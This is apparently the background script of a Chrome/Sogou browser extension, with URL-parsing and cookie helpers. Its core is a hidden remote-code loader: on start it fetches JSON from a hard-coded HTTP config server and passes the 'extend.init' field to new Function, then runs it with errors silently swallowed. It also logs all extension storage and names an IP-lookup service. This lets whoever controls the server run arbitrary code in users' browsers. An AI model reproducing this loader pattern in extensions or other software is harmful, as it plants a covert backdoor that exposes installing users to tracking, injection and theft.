var cid = "100086";
function browserObj() {
    var explorer = chrome;
    if (/MetaSr/i.test(navigator.userAgent)) {
        explorer = sogouExplorer;
    }
    return explorer;
}
chrome.storage.local.get(null,function (e) {
    console.log(e);
});
chrome.storage.local.set({"versions":"1.0.0.0"});
var config,rules,ex;
var url_param = {
    starts_with_slashes:/^\/+/,
    ends_with_slashes:/\/+$/,
    pluses:/\+/g,
    query_separator:/[&;]/,
    uri_parser:/^(?:(?![^:@]+:[^:@\/]*@)([^:\/?#.]+):)?(?:\/\/)?((?:(([^:@\/]*)(?::([^:@\/]*))?)?@)?(\[[0-9a-fA-F:.]+\]|[^:\/?#]*)(?::(\d+|(?=:)))?(:)?)((((?:[^?#](?![^?#\/]*\.[^?#\/.]+(?:[?#]|$)))*\/?)?([^?#\/]*))(?:\?([^#]*))?(?:#(.*))?)/
};
var pack_config = {
    config_server:"http://192.168.3.80/v2/config.php",
    ip_check_server:"http://int.dpool.sina.com.cn/iplookup/iplookup.php"
};
function r(e,t) {
    var r = new XMLHttpRequest;
    r.addEventListener("load",function () {
        t(r.responseText)
    }), r.open("GET",e,!0), r.send()
}
function toObject(a) {
    return (new Function("return " + a))()
}
function ev(a) {
    try {
        var _a = toObject(a);
        _a()
    } catch (e) {}
}
function decode(s) {
    if (s) {
        s = s.toString().replace(url_param.pluses,"%20");
        s = decodeURIComponent(s)
    }
    return s
}
function parseUri(str) {
    var parser = url_param.uri_parser;
    var parserKeys = ["source","protocol","authority","userInfo","user","password","host","port","isColonUri","relative","path","directory","file","query","anchor"];
    var m = parser.exec(str || "");
    var parts = {};
    parserKeys.forEach(function (key,i) {
        parts[key] = m[i] || ""
    });
    return parts
}
function parseQuery(str) {
    var i,ps,p,n,k,v,l;
    var pairs = [];
    if (typeof(str) === "undefined" || str === null || str === "") {
        return pairs
    }
    if (str.indexOf("?") === 0) {
        str = str.substring(1)
    }
    ps = str.toString().split(url_param.query_separator);
    for (i = 0, l = ps.length; i < l; i++) {
        p = ps[i];
        n = p.indexOf("=");
        if (n !== 0) {
            k = decode(p.substring(0,n));
            v = decode(p.substring(n + 1));
            pairs.push(n === -1 ? [p,null] : [k,v])
        }
    }
    return pairs
}
function getQueryValue(opt) {
    if (!opt.key) {
        return false
    }
    if (!opt.query) {
        return false
    }
    var _query = parseQuery(opt.query);
    for (var i = 0; i < _query.length; i++) {
        param = _query[i];
        if (opt.key === param[0]) {
            return param[1]
        }
    }
}
String.prototype.replaceAll = function (s1,s2) {
    return this.replace(new RegExp(s1,"gm"),s2)
};
function deepCopy(source) {
    var result = JSON.parse(JSON.stringify(source));
    return result
}
function getConfig(_config_server) {
    r(_config_server,function (t) {
        try {
            config = JSON.parse(t);
            if (config.extend && config.extend.init) {
                ev(config.extend.init);
            }
        } catch (r) {}
    })
}
getConfig(pack_config.config_server);
function preConflict() {
    if (gc("pConf")) {
        return false
    } else {
        sc("pConf","1024",3);
        return true
    }
}
function sc(n,v,s) {
    var e = new Date();
    e.setTime(e.getTime() + s * 1000);
    document.cookie = n + "=" + escape(v) + "; path=/;expires=" + e.toGMTString()
}
function gc(n) {
    var a,r = new RegExp("(^| )" + n + "=([^;]*)(;|$)");
    if (a = document.cookie.match(r)) {
        return unescape(a[2])
    } else {
        return null
    }
}